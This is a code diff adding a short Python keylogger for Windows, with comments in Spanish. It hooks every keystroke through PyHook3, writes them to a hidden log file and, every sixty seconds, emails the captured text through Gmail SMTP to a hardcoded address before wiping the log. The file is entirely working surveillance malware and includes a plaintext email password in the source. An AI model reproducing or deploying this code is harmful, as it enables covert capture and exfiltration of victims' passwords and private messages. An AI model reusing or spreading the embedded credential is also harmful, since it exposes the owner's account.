@@ -1,0 +1,67 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Mon Aug 20 00:05:30 2018
+
+@author: Carlos
+"""
+import PyHook3, pythoncom, sys, logging
+import time, datetime
+
+wait_seconds = 60
+timeout = time.time() + wait_seconds
+file_log = "C:\\secret\\dat.txt"
+
+def TimeOut():
+    if time.time() > timeout:
+        return True
+    else:
+        return False
+    
+def sendEmail(user, pwd, recipient, subject, body):
+    import smtplib
+    
+    gmail_user = user
+    gmail_pass = pwd
+    FROM = user
+    TO = recipient if type(recipient) is list else[recipient]
+    SUBJECT = subject
+    TEXT = body
+    message = """\From: %s\nTo: %s\Subject: %s\n\n%s
+    """ % (FROM, ",".join(TO), SUBJECT, TEXT)
+    
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.ehlo()
+        server.starttls()
+        server.login(gmail_user, gmail_pass)
+        server.sendmail(FROM, TO, message)
+        server.close
+        print("Correo enviado satisfactoriamente")
+    except:
+        print ("Error al enviar el correo")
+        
+def FormatAndSendLogEmail():
+    with open(file_log, 'r+') as f:
+        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        data = f.read().replace('\n', '');
+        data = 'Log capturado a las: ' + actualdate + '\n' + data
+        sendEmail('cgarnica1999@gmail.com', '31000208a', 'cgarnica1999@gmail.com', 'Nuevo log - ' + actualdate, data)
+        f.seek(0)
+        f.truncate()
+        
+
+def OnKeyBoardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    logging.log(10, chr(event.Ascii))
+    return True
+
+hooks_manager = PyHook3.HookManager()
+hooks_manager.KeyDown = OnKeyBoardEvent
+hooks_manager.HookKeyboard()
+
+while True:
+    if TimeOut():
+        FormatAndSendLogEmail()
+        timeout = time.time() + wait_seconds
+        
+    pythoncom.PumpWaitingMessages()
